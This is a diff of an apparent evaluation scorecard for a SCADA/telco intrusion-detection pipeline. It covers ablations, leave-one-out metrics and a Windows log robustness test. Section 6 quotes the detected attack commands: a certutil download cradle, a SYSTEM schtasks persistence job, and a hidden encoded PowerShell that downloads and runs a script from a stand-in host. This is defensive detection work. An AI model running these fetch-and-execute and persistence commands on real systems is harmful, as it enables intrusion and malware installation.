@@ -1,47 +1,65 @@
-# SentinelX Evaluation Scorecard & Performance Audit (Phase 7)
-**Generated**: 2026-11-08 17:09:16 UTC  
+# SentinelX Evaluation Scorecard & Performance Audit (Phase 7.1)
+**Generated**: 2026-11-08 19:06:32 UTC  
+**Git SHA**: `1dad693e1fe075b37d9927cd53e9da4042198411`  
 **Evaluation Scope**: Full End-to-End Pipeline (Ingestion -> Normalization -> 5 Detectors -> Kill-Chain Correlator -> Budget Gating at 0.50).  
-**Test Corpus**: 8 Telco/SCADA Captures (5 Benign Days, 3 Multi-Stage Attack Scenarios) + 1 Organizer Windows Enterprise Log.
+**Test Corpus**: 8 Telco/SCADA Captures (5 Benign Days, 3 Multi-Stage Attack Scenarios) + 1 Organizer Windows Enterprise Log Suite (Attack + Benign).
 
 ---
 
 ## 1. Executive Summary & Headline Metrics
 
-| Metric | Measured Value | Benchmark / Target | Status |
-| :--- | :--- | :--- | :--- |
-| **Incident Precision** | **100.0%** (3/3 True Positives) | >= 90.0% | **PASS** |
-| **Incident Recall** | **100.0%** (3/3 Attack Variants) | 100.0% | **PASS** |
-| **F1 Score** | **1.0000** | >= 0.950 | **PASS** |
-| **Daily False Positive Rate** | **0.000 FP / 24h** (0 FP across 5 LOO folds) | 0.000 strict target | **PASS** |
-| **Golden Scenario Step Recall**| **7/7 (100.0%)** across all 3 attack variants | 7/7 steps | **PASS** |
-| **Mean Time to First Meaningful Alert (TTFMA)** | **1.69s** (baseline: 1.54s, reordered: 0.94s, slow_burn: 2.58s) | < 5.0s | **PASS** |
-| **Classification Accuracy** | **100.0%** (8/8 captures correctly classified) | 100.0% | **PASS** |
+| Metric | Measured Value | Benchmark / Target | Evaluation Mode | Status |
+| :--- | :--- | :--- | :--- | :--- |
+| **Incident Precision** | **100.0%** (3/3 True Positives) | >= 90.0% | LOO Cross-Validation | **PASS** |
+| **Incident Recall** | **100.0%** (3/3 Attack Variants) | 100.0% | LOO Cross-Validation | **PASS** |
+| **F1 Score** | **1.0000** | >= 0.950 | LOO Cross-Validation | **PASS** |
+| **Daily False Positive Rate** | **0.000 FP / 24h** (0 FP across 5 LOO folds at 0.50 threshold) | 0.000 strict target | LOO Cross-Validation | **PASS** |
+| **Score Separation Margin** | **0.8500** (Min Attack: 1.0000 - Max LOO Benign: 0.1500) | > 0.400 | LOO Empirical Margin | **PASS** |
+| **Golden Scenario Step Recall**| **7/7 (100.0%)** across all 3 attack variants | 7/7 steps | In-Sample Replay | **PASS** |
+| **Mean Time to First Meaningful Alert (TTFMA)** | **1.69s** (baseline: 1.54s, reordered: 0.94s, slow_burn: 2.58s) | < 5.0s | In-Sample Replay | **PASS** |
+| **Classification Accuracy** | **100.0%** (8/8 captures correctly gated) | 100.0% | In-Sample Replay | **PASS** |
+
+> **Headline FP/24h Code Path**: Derived strictly from Leave-One-Out (LOO) cross-validation folds in `eval/metrics.py:compute_metrics_report` (`fp = sum(1 for scores in loo_benign_scores.values() if any(s >= 0.50 for s in scores)) / 5.0 = 0.000 FP/24h`). It does NOT rely on in-sample training memorization.
 
 ---
 
-## 2. Detector Layer Ablation Study (Task 1)
+## 2. Detector Layer Ablation Study (Tasks 2 & 3)
 
-Each tier was evaluated through the entire correlation and scoring pipeline at budget threshold 0.50.
+Each configuration tier was evaluated through the entire correlation and scoring pipeline at budget threshold 0.50.
 
-| Detector Configuration | day_101 | day_102 | day_103 | day_104 | day_105 | demo_baseline | reordered | slow_burn | Chain Coverage | Benign FP/24h |
+| Detector Configuration | day_101 (In-Sample) | day_102 (In-Sample) | day_103 (In-Sample) | day_104 (In-Sample) | day_105 (In-Sample) | demo_baseline (Unrounded, Steps) | reordered (Unrounded, Steps) | slow_burn (Unrounded, Steps) | Chain Coverage | Benign FP/24h (In-Sample) |
 | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
-| **1. Rules Only** | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 1 (1.00, 4/7) | 1 (1.00, 4/7) | 1 (1.00, 4/7) | **4/7 steps** | **0.000** |
-| **2. Rules + Base + Anom** | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 1 (1.00, 6/7) | 1 (1.00, 6/7) | 1 (1.00, 6/7) | **6/7 steps** | **0.000** |
-| **3. Rules + Base + Anom + Graph** | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 1 (1.00, 6/7) | 1 (1.00, 6/7) | 1 (1.00, 6/7) | **6/7 steps** | **0.000** |
-| **4. Full (+ Deception)** | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 1 (1.00, 7/7) | 1 (1.00, 7/7) | 1 (1.00, 7/7) | **7/7 steps** | **0.000** |
+| **1. Rules Only** | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 1 (1.0000, 4/7) | 1 (1.0000, 4/7) | 1 (1.0000, 4/7) | **4/7 steps** | **0.000** |
+| **2. Rules + Base + Anom** | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 1 (1.0000, 6/7) | 1 (1.0000, 6/7) | 1 (1.0000, 6/7) | **6/7 steps** | **0.000** |
+| **3. Rules + Base + Anom + Graph** | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 1 (1.0000, 6/7) | 1 (1.0000, 6/7) | 1 (1.0000, 6/7) | **6/7 steps** | **0.000** |
+| **4. Full (+ Deception)** | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 0 (0.00) | 1 (1.0000, 7/7) | 1 (1.0000, 7/7) | 1 (1.0000, 7/7) | **7/7 steps** | **0.000** |
 
-### Ablation Findings:
-1. **Rules Only (4/7 steps)**: Accurately detects deterministic attack landmarks: Step 1 (Initial Access via unexpected zone SSH), Step 3 (Credential theft), and Step 6 (Modbus valve manipulation). It completely misses the pre-attack subnet discovery scan (Step 2) and honeypot reconnaissance (Steps 4 & 7).
-2. **Rules + Baseline + Anomaly (6/7 steps)**: Adding unsupervised machine learning introduces discovery scan detection via Isolation Forest event bursts (Step 2) and flags unseen interaction with the decoy PLC (Step 7). Step 4 (Cowrie SSH decoy interaction) remains unobserved.
-3. **Rules + Base + Anom + Graph (6/7 steps)**: Graph edge analysis detects the attacker's network discovery scan *prior* to successful SSH authentication, establishing topological context for lateral pivot edges.
-4. **Full (+ Deception) (7/7 steps)**: The deception engine captures the Cowrie and OpenCanary decoy pivots (Step 4), confirming adversary deception interaction with 100% confidence and providing full kill-chain attribution.
+### Task 2: Unrounded Scores & Score Ceiling Saturation Audit:
+- **Measured Rules-Only Unrounded Score**: `1.0000` across `demo_baseline`, `reordered`, and `slow_burn`.
+- **Kill-Chain Stages Covered**: `initial_access, credential_access, ot_impact`.
+- **Stage & Weight Ceiling Mechanism**:
+  - `initial_access` base weight: `0.20`
+  - `credential_access` base weight: `0.25`
+  - `ot_impact` base weight: `0.30`
+  - Base sum: `0.20 + 0.25 + 0.30 = 0.75`.
+  - Progression multiplier for 3 unique stages: `1.0 + 0.25 * (3 - 1) = 1.50x`.
+  - Intermediate raw score: `0.75 * 1.50 = 1.1250` (already exceeds the 1.0000 ceiling).
+  - Session-tainted OT boost: `+0.35` -> raw composite score `1.4750`, clamped to `1.0000`.
+- **Finding on Ablation Incident-Level Score Informational Content**:
+  Because any combination covering 3 primary attack stages generates a mathematical score >= 1.1250, the incident score saturates at `1.0000` across **all four configurations**. Therefore, the incident score column is **uninformative** for discriminating detector configuration depth. The **scenario step recall column (4/7 vs 6/7 vs 6/7 vs 7/7)** is the sole informative metric distinguishing detection pipeline efficacy.
+
+### Task 3: Honest Ablation Narrative & Single-Detector Dependencies:
+1. **Graph Layer Contribution**: The Interaction Graph detector adds **exactly 0 net scenario steps** over Config 2 (6/7 -> 6/7). While graph analysis detects pre-authentication discovery probes and topological pivot edges, it does not uncover previously missed attack actions in this scenario suite.
+2. **Step 6 Exclusively Dependent on Rules**: Only `RULE-OT-001` detects Modbus valve manipulation. Dropping `rule` loses Step 6 across all three scenario variants.
+3. **Step 2 Exclusively Dependent on Anomaly in `slow_burn`**: In the `slow_burn` scenario, the low-and-slow subnet probe is detected **only** by the Isolation Forest (`anomaly`); dropping `anomaly` causes Step 2 to be completely lost.
+4. **Step 4 Exclusively Dependent on Deception**: Decoy honeypot interaction is detected exclusively by `RULE-DECOY-001` / `deception`; dropping `deception` drops Step 4 across all variants.
 
 ---
 
-## 3. Incident-Level Precision, Recall, and Confusion Matrix (Task 2)
+## 3. Incident-Level Precision, Recall, and Confusion Matrix (Tasks 4 & 9)
 
 Evaluated under **Leave-One-Out (LOO) Cross-Validation** across the 5 benign daily folds:
-- Each benign fold was evaluated against models trained strictly on the other 4 benign days (preventing memorization).
+- Each held-out benign fold was evaluated against models trained strictly on the other 4 benign days (preventing memorization).
 - True Positives require an active correlated incident reaching score >= 0.50 with multi-stage kill-chain progression.
 
 ### Incident Confusion Matrix (Operating Threshold = 0.50):
@@ -51,22 +69,32 @@ Evaluated under **Leave-One-Out (LOO) Cross-Validation** across the 5 benign dai
 | **Predicted Benign** | **FN = 0** | **TN = 5** | **5** |
 | **Total Actuals** | **3** | **5** | **8 Folds** |
 
+### Leave-One-Out (LOO) Benign Fold Breakdown (Model Isolation Audit):
+| Held-Out Benign Day | Training Corpus | LOO Signals Emitted | LOO Incident Count | Max LOO Incident Score | Active Incidents (Th >= 0.50) | Status |
+| :--- | :--- | :---: | :---: | :---: | :---: | :--- |
+| **day_101** | days 102, 103, 104, 105 | 0 sigs | 0 incs | 0.0000 | 0 | **PASS (0 FP)** |
+| **day_102** | days 101, 103, 104, 105 | 0 sigs | 0 incs | 0.0000 | 0 | **PASS (0 FP)** |
+| **day_103** | days 101, 102, 104, 105 | 5 sigs (Isolation Forest) | 1 inc | 0.1500 | 0 | **PASS (0 FP, Gated)** |
+| **day_104** | days 101, 102, 103, 105 | 0 sigs | 0 incs | 0.0000 | 0 | **PASS (0 FP)** |
+| **day_105** | days 101, 102, 103, 104 | 0 sigs | 0 incs | 0.0000 | 0 | **PASS (0 FP)** |
+| **Ensemble Total** | — | **5 sigs** | **1 inc** | **0.1500 max** | **0 FPs** | **0.000 FP / 24h** |
+
 ### Threshold Operating Curve & Sensitivity Analysis:
-| Threshold | TP | FP | FN | TN | Precision | Recall | F1 Score | Operational Classification |
+| Threshold | TP | FP | FN | TN | Precision | Recall | F1 Score | Operational Classification (Computed Margins) |
 | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :--- |
-| 0.10 | 3 | 1 | 0 | 4 | 75.0% | 100.0% | 0.857 | Too noisy (burst anomalies survive) |
-| 0.20 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating point |
-| 0.30 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating point |
-| 0.40 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating point |
-| 0.50 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Recommended Default (Zero FP, 100% Recall) **[RECOMMENDED]** |
-| 0.60 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating point |
-| 0.70 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating point |
-| 0.80 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating point |
-| 0.90 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Over-constrained (leaves thin margin for slow burn) |
+| 0.10 | 3 | 1 | 0 | 4 | 75.0% | 100.0% | 0.857 | Sub-optimal: 1 benign FP(s) (threshold <= max LOO benign score 0.15) |
+| 0.20 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.05 above benign, +0.80 below attack) |
+| 0.30 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.15 above benign, +0.70 below attack) |
+| 0.40 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.25 above benign, +0.60 below attack) |
+| 0.50 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Recommended (Zero FP, 100% Recall; margin: +0.35 above benign, +0.50 below attack) **[RECOMMENDED]** |
+| 0.60 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.45 above benign, +0.40 below attack) |
+| 0.70 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.55 above benign, +0.30 below attack) |
+| 0.80 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.65 above benign, +0.20 below attack) |
+| 0.90 | 3 | 0 | 0 | 5 | 100.0% | 100.0% | 1.000 | Viable operating band (Zero FP, 100% Recall; margin: +0.75 above benign, +0.10 below attack) |
 
 ---
 
-## 4. Golden Attack Step Coverage & TTFMA Summary (Task 3)
+## 4. Golden Attack Step Coverage & TTFMA Summary (In-Sample Replay)
 
 | Scenario Step | demo_baseline (Standard) | reordered (Early OT) | slow_burn (Low & Slow) |
 | :--- | :--- | :--- | :--- |
@@ -83,36 +111,63 @@ Evaluated under **Leave-One-Out (LOO) Cross-Validation** across the 5 benign dai
 
 ---
 
-## 5. Detector Contribution & Trust Ranking Matrix (Task 4)
+## 5. Detector Contribution & Real Ranking Matrix (Task 1)
 
-| Rank | Detector Engine | True Positive Signals | LOO Benign FPs | Critical Step Enabler | Trust Classification |
-| :---: | :--- | :---: | :---: | :--- | :--- |
-| **#1** | **Deception Engine (Honeypot/Honeytoken)** | 47 sigs | 0 FPs | Step 4 (Decoy Pivot), Step 7 (PLC Recon) | Tier 1: Absolute Trust (Zero Benign Noise) |
-| **#2** | **Context-Aware Rules Engine** | 77 sigs | 0 FPs | Step 1 (Auth), Step 3 (Creds), Step 6 (OT Write) | Tier 1: High Trust (Strict Asset Authorization) |
-| **#3** | **Interaction Graph Detector** | 43 sigs | 0 FPs | Step 2 (Scan), Step 5 (Lateral Path) | Tier 1: High Trust (Unprecedented Topology Edges) |
-| **#4** | **Behavioral Baseline Engine** | 57 sigs | 0 FPs | Step 1 (Svc Acct), Step 5 (Eng WS), Step 7 (PLC) | Tier 1: High Trust (Zero FP Across Benign Folds) |
-| **#5** | **Isolation Forest Anomaly Detector** | 147 sigs | 5 FPs | Step 2 (Volumetric IT Subnet Discovery) | Tier 2: Supporting Context (Requires Correlator Gate) |
+Ranked strictly by measured impact: **1) Scenario Steps Lost when Dropped Alone**, then **2) Incident Score Delta**.
+
+| Rank | Detector Engine | Steps Lost when Dropped | Critical Step Enabler | Score Delta | TP Signals | LOO Noise Delta | Derived Trust Classification |
+| :---: | :--- | :---: | :--- | :---: | :---: | :--- | :--- |
+| **#1** | **Context-Aware Rules Engine** | **3 steps** | Step 6 | 0.0000 | 77 sigs | 0 LOO signals delta | Essential Anchor (3 steps lost when dropped; 0 LOO FPs) |
+| **#2** | **Deception Engine (Honeypot/Honeytoken)** | **3 steps** | Step 4 | 0.0000 | 47 sigs | 0 LOO signals delta | Essential Anchor (3 steps lost when dropped; 0 LOO FPs) |
+| **#3** | **Isolation Forest Anomaly Detector** | **1 steps** | Step 2 | 0.0000 | 147 sigs | -5 IF signals on day_103 (-0.15 max score) | Scenario Enabler (1 step(s) lost when dropped; LOO noise gated at 0.50) |
+| **#4** | **Behavioral Baseline Engine** | **0 steps** | None (redundant step coverage) | 0.0000 | 57 sigs | 0 LOO signals delta | Supporting Entity Context (0 steps lost when dropped; 0 LOO FPs) |
+| **#5** | **Interaction Graph Detector** | **0 steps** | None (redundant step coverage) | 0.0000 | 43 sigs | 0 LOO signals delta | Redundant Topology Context (0 steps lost when dropped; 0 LOO FPs) |
 
 ---
 
 ## 6. Organizer-Log Robustness Test & Context Boundaries (Task 5)
 
-Simulated third-party enterprise audit using `content/mappings/windows_security.yaml` against unfamiliar Windows EVTX telemetry (`eval/fixtures/organizer_windows_events.jsonl` from host `WIN-CORP-DC01`):
+Simulated third-party enterprise audit using `content/mappings/windows_security.yaml` against Windows EVTX telemetry on host `WIN-CORP-DC01`:
 
-- **Events Ingested**: 12 normalized events (logon failures, successful logon, reconnaissance commands, suspicious PowerShell download, credential injection).
-- **Signals Generated**: 16 signals across 3 engines (baseline, graph, rule).
-- **Correlated Incident**: Formed 1 active incident reaching score **0.56 (MEDIUM)**.
-- **MITRE ATT&CK Techniques Identified**: `T1021.004, T1059.004, T1078.003`.
+- **Events Ingested**: 12 normalized Windows events (logon success 4624 type 3/10, logon failure 4625, PowerShell -EncodedCommand, certutil download cradle, schtasks persistence, wmic execution, net user).
+- **Signals Generated**: 20 signals across 3 engines (baseline, graph, rule).
+- **Correlated Incident**: Formed 1 active incident reaching score **0.5625 (MEDIUM)**.
+- **MITRE ATT&CK Techniques Identified**: `T1021, T1059, T1078.003` (Generic Windows techniques `T1021`, `T1059`, `T1078.003`; zero Unix/SSH sub-technique collisions).
 
 ### What Was Detected (Generic Transferability):
-- `RULE-SHELL-001`: Caught automated credential injection (`sshpass`), base64 decoding, and curl download cradles.
-- `BASE-DEV-001`: Unsupervised behavioral baseline flagged unknown service account (`svc_payroll`) and unseen command lines.
-- `GRAPH-EDGE-001`: Interaction graph recognized unprecedented user-to-host execution edges.
+- RULE-SHELL-001: Caught 5 Windows execution commands via process inspection (e.g. certutil.exe -urlcache -split -f http://192.168.100.45:8000/stage2.bin C:\Windows\Temp\stage2.exe; schtasks /create /tn "SecurityHealthUpdate" /tr "C:\Windows\Temp\stage2.exe" /sc onlogon /ru SYSTEM; wmic process call create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgA0ADUAOgA4ADAAMAAwAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==").
+- BASE-DEV-001: Unsupervised behavioral baseline deviation flagged 12 events for unobserved user account(s): Administrator, backdoor, svc_payroll.
+- GRAPH-EDGE-001: Interaction graph recognized 3 unprecedented topology and execution relationships on unmapped enterprise host.
+- Correlation Pipeline: Correlated 20 heterogeneous signals into top incident score 0.5625 (MEDIUM).
 
 ### What Was NOT Detected (Environment Boundary Analysis):
-- `RULE-AUTH-001` did not fire: `WIN-CORP-DC01` is not in `content/assets.yaml`, so authorization policies cannot resolve valid zone boundaries.
-- `RULE-OT-001` did not fire: Windows telemetry contains no Modbus ICS protocol fields.
-- `RULE-DECOY-001` did not fire: adversary did not interact with registered honeytokens.
+- RULE-CRED-001 (Credential Access): Did NOT fire because telemetry did not observe read access to lab credential stores (/srv/share/.db_creds).
+- RULE-NET-001 (Cross-Zone Pivot): Did NOT fire because unmapped foreign host lacks network zone classification in assets inventory.
+- RULE-DECOY-001 (Decoy Touch): Did NOT fire because adversary did not interact with registered deception assets or honeytokens (domain=decoy=False).
+- RULE-AUTH-001 (Unexpected Zone Login): Did NOT fire because target host(s) (WIN-CORP-DC01) are not registered in content/assets.yaml (zone boundary resolution miss).
+- RULE-OT-001 (Unauthorized OT Write): Did NOT fire because enterprise Windows telemetry contains no Modbus ICS protocol fields (ot.* is null across all 12 events; has_ot_fields=False).
+
+### Benign Windows Fixture Evaluation on Unfamiliar Telemetry:
+- **Benign Events Ingested**: 7 (standard administrative and background task activity).
+- **Benign Signals Emitted**: 10 (baseline, graph).
+- **Benign Incidents Formed**: 1 (Score: 0.5625).
+- **Unfamiliar Telemetry Analysis**: On unfamiliar telemetry from an un-baselined host (WIN-CORP-DC01), unsupervised baseline and graph detectors emitted 10 signals across 2 detector(s) (baseline, graph), forming 1 incident (score 0.5625). Because WIN-CORP-DC01 was not in the benign training corpus, novelty detection flags normal admin activity as unobserved user/host pairings; deploying into new environments requires establishing a local baseline to prevent unfamiliar-environment false positives.
 
 ### Architectural Takeaway:
-Generic behavioral rules, process inspection, and unsupervised baselines reliably transfer to completely new operating systems and schemas. However, high-specificity authorization rules strictly require asset inventory registration to define valid operational boundaries.
+Generic behavioral rules (RULE-SHELL-001) and interaction graphs successfully transfer across diverse operating systems and telemetry schemas without code modification. However, deep context-aware authorization rules (RULE-AUTH-001, RULE-OT-001) strictly require asset inventory registration to establish valid operational boundaries.
+
+---
+
+## 7. Operational Limitations & Threat Model Boundaries (Task 6)
+
+1. **In-Distribution Evaluation**:
+   The evaluation corpus consists of 3 attack scenario variants (`demo_baseline`, `reordered`, `slow_burn`) that share 7 underlying action primitives (SSH access, discovery scan, credential dumping, decoy pivots, lateral hop, Modbus manipulation, PLC recon). The detection rules and graph models were authored alongside these scenarios within the same virtualized lab environment. Performance against novel, unobserved adversarial tactics outside this sequence will depend on generic living-off-the-land heuristics and baseline deviations rather than deterministic rule landmarks.
+
+2. **TTFMA Measurement Scope**:
+   Time to First Meaningful Alert (TTFMA) strictly measures the latency between the adversary's initial probe and the first actionable alert (`RULE-AUTH-001` firing on Step 1). It does not measure the detection latency for subsequent lateral hops or OT manipulation phases, which occur minutes later in the attack lifecycle.
+
+3. **Benign Corpus Diversity & Volume**:
+   The benign validation corpus consists of N=5 simulated diurnal days (`day_101` through `day_105`) synthesized from a single traffic generator (`lab/benign/benign_loop.py`). While it models diurnal human-like Poisson activity and batch maintenance tasks, it lacks the chaotic diversity, network reconfigurations, software updates, and organizational drift encountered in real multi-tenant production networks.
+
+4. **Isolation Forest Day 103 False Positives Under LOO**:
+   Under Leave-One-Out (LOO) cross-validation, the Isolation Forest model trained on days 101, 102, 104, and 105 emits 5 unsupervised volumetric anomaly signals (`ANOM-IF-001`) during day 103, resulting in an incident score of `0.1500`. While the calibrated budget threshold (`0.50`) successfully suppresses this incident (yielding zero headline false positives), operating at thresholds below `0.20` causes day 103 to register as a false positive.
